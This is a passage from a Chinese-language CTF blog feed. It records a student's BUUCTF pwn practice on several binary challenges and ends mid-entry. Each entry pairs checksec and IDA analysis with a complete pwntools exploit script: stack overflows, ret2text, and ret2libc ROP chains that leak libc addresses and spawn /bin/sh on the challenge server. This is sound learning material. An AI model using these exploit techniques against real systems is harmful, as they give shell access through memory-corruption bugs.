class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#from LibcSearcher import*</span><br> <br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>content = <span class="hljs-number">0</span><br>elf = ELF(<span class="hljs-string">&quot;babyrop2&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;babyrop2&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27333</span>)<br><br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>got_addr  = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>plt_addr  = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>pop_rdi   = <span class="hljs-number">0x0400733</span><br>pop_r15   = <span class="hljs-number">0x0400731</span><br>format_   = <span class="hljs-number">0x0400770</span><br>ret_addr  = <span class="hljs-number">0x04004d1</span><br><br>payload   = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(pop_rdi) + p64(format_) + p64(pop_r15) + p64(got_addr) + p64(<span class="hljs-number">0</span>) + p64(plt_addr) + p64(main_addr)<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br>write_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><br><span class="hljs-comment">#lib</span><br><br>lib_write  = lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>lib_system = lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lib_binsh  = <span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br> <br>base_addr   = write_addr - lib_write<br>system_addr = base_addr + lib_system<br>binsh_addr  = base_addr + lib_binsh<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(ret_addr)+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br><br>p.interactive()<br>main() <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第三天</title>
    <link href="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
    <url>/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>经典拿到题先check一下，32位，只开了nx保护:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串信息，直接看到了system和&#x2F;bin&#x2F;sh</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180438095.png" alt="image-20230205180438095"></p><p>那一下就很清晰了，直接利用这些去构造system(&#x2F;bin&#x2F;sh)，只需要找到一个输入点就可以了，先看一下main函数，里面有一个vulnerable_fuction，跟进后发现了输入点。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180900543.png" alt="image-20230205180900543"></p><p>直接写exp:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25870</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./jarvisoj_level2&#x27;</span>)  <br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-number">0x0804a024</span><br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">136</span>+<span class="hljs-number">4</span>) + p32(system_addr)+p32(main_addr)+p32(binsh_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>64位程序，只开了nx保护:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串，发现&#x2F;bin&#x2F;sh</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181702275.png" alt="image-20230205181702275"></p><p>跟进之后找到后门函数:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181725468.png" alt="image-20230205181725468"></p><p>也就是这个backdoor了:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182537277.png" alt="image-20230205182537277"></p><p>查看main函数，发现有俩输入,这两个nbyes我自己也没太搞懂，就刷了刷别人的wp，但是别人写的仍然感觉云里雾里，搞了半天才明白，原来第二次输入的那个buf的数据长度由我们第一次输入的nbytes来控制。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182159480.png" alt="image-20230205182159480"></p><p>附上exp:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">p</span>=remote(&#x27;node4.buuoj.cn&#x27;,28787)<br><span class="hljs-attribute">shell_addr</span>=0x4006e6<br><br>p.sendline(<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x10+8)+p64(shell_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>例行检查，32位，只开了nx保护(你们这三道题还真是出奇的一致呢&#x3D; &#x3D;):</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串，直接看到了flag.txt。哇，是幸福的味道:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182841310.png" alt="image-20230205182841310"></p><p>跟进过后，发现这个函数的意思大概就是让a1&#x3D;0x308cd64f，a2&#x3D;0x195719d1<img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182906447.png" alt="image-20230205182906447"></p><p>本以为是一道平平无奇的题目，结果看了一下a1,a2的位置，居然在00000000的后面，没法利用溢出控制，直接懵逼。又去看了别人的wp，发现好多人都在用什么mprotect函数跳过bss，额，可是我太菜了搞不太懂QAQ。又是一番搜寻，终于找到了一个弄的懂的wp。</p><p>这边我们要想办法绕过这个if判断，tap+空格来到这个界面，看到从0x80489bb开始，程序开始设置打开flag.txt的参数，我们只要将程序执行流跳转到这里就可以读出flag:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183455880.png" alt="image-20230205183455880"></p><p>不得不服网上大佬的强大。找到函数中的输入点，溢出覆盖返回地址。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183811164.png" alt="image-20230205183811164"></p><p>exp如下:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><br><span class="hljs-variable">p</span>=<span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="hljs-variable">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x38</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x80489bb</span>)</span><br><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第二天</title>
    <link href="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <url>/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>首先还是check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>IDA打开后，shift+f12查看字符串f看到了&#x2F;bin&#x2F;sh:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129154915239.png" alt="image-20230129154915239"></p><p>双击，发现了&#x2F;bin&#x2F;sh在函数callsystem()中:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155107710.png" alt="image-20230129155107710"></p><p>查看该函数，发现含有system(“&#x2F;bin&#x2F;sh”)，同时发现main里只有一个write，和一个返回语句</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155228230.png" alt="image-20230129155228230"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155234812.png" alt="image-20230129155234812"></p><p>打开返回函数，发现read可以读入0x200的字符串，再看一下buf的长度是0x80，存在溢出</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155351770.png" alt="image-20230129155351770"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155403160.png" alt="image-20230129155403160"></p><p>回看后门函数callsystem的函数地址为0x400596:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155604148.png" alt="image-20230129155604148"></p><p>构造exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26880&#x27;</span>)<br> <br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x400596</span>)<br><br>p.sendline(payload)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>经典check环节:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>审计一下main函数里的代码,观察到只有输入1才能进下一步:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164638161.png" alt="image-20230129164638161"></p><p>主函数能获取到的信息有限，按顺序先看一下begin()函数，发现好像是小程序一类的，1是加密，2是解密:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164946246.png" alt="image-20230129164946246"></p><p>进入加密函数encrypt()看一下，发现gets，栈溢出漏洞出现了。这段代码大概意思就是，读取s，然后根据ascii码范围不同分别进行异或:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165117594.png" alt="image-20230129165117594"></p><p>64位程序里面的传参方式是前六位参数为寄存器传参，故不能直接把参数写在栈里，需要通过gadgets来实现控制寄存器的值从而控制函数参数的值。我们用gadget去找一下pop rdi的地址,</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>pop rdi ; ret<span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure><p>为0x400c83，然后通过 p64(pop_rdi_addr)+p64(参数值)+p64(函数地址) 即可调用函数:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165443140.png" alt="image-20230129165443140"></p><p>特别注意到题目是部署在Ubuntu18上的，因此调用system需要栈对齐，这里填充ret来对齐,地址为0x4006b9:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>ret<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">string</span>):<br>    newstr = <span class="hljs-built_in">list</span>(string)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(newstr)):<br>        c = <span class="hljs-built_in">ord</span>(string[i])<br>        <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">96</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">122</span>:<br>            <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">90</span>:<br>                <span class="hljs-keyword">if</span> c &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">57</span>:<br>                    c ^= <span class="hljs-number">0xF</span><br>            <span class="hljs-keyword">else</span>:<br>               c ^= <span class="hljs-number">0xE</span><br>        <span class="hljs-keyword">else</span>:<br>            c ^= <span class="hljs-number">0xD</span><br>        newstr[i] = <span class="hljs-built_in">chr</span>(c)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(newstr)<br><span class="hljs-comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29403)</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400C83</span> <span class="hljs-comment">#一个万能的gadget，x64程序基本都存在，pop rdi;ret;</span><br><span class="hljs-comment">#start_addr = 0x0000000000400790</span><br>main_addr = <span class="hljs-number">0x000000000400B28</span> <span class="hljs-comment">#主函数地址</span><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-comment">#泄露puts实际地址</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendline(encrypt(payload))<br><br><span class="hljs-comment">#print encrypt(payload)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#接受puts的实际地址</span><br>addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#print &quot;addr=&quot;, hex(addr)</span><br><span class="hljs-comment">#此处搜寻到的libc是本机的libc-2.23.so,需要自行添加到database，</span><br><span class="hljs-comment">#具体方法可上github，搜寻libc_database项目</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, addr)<br>libcbase = addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br><span class="hljs-comment">#print &#x27;str_bin_sh=&#x27;,hex(libc.dump(&#x27;str_bin_sh&#x27;))</span><br><span class="hljs-comment">#print libc.dump(&#x27;system&#x27;)</span><br><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br>sys_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment">#下面为正常脚本，可以在kali中拿到shell，如果是Ubuntu18，需要在里面加ret进行栈对齐</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>ret = <span class="hljs-number">0x4006b9</span><br>payload_Ubuntu18 = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>经典的ret2libc的题，但还是感觉有点难，后续还要再看看。这里exp引用了csdn的一篇文章,附上连接:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/qinying001/article/details/<span class="hljs-number">103266763</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6661</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;utm_relevant_index=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>经典check，这保护开的，第一次见到这种场面的我心脏骤停:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Arch:</span>     i386-<span class="hljs-number">32</span>-little<br><span class="hljs-symbol">RELRO:</span>    <span class="hljs-keyword">Partial</span> RELRO<br><span class="hljs-symbol">Stack:</span>    canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE 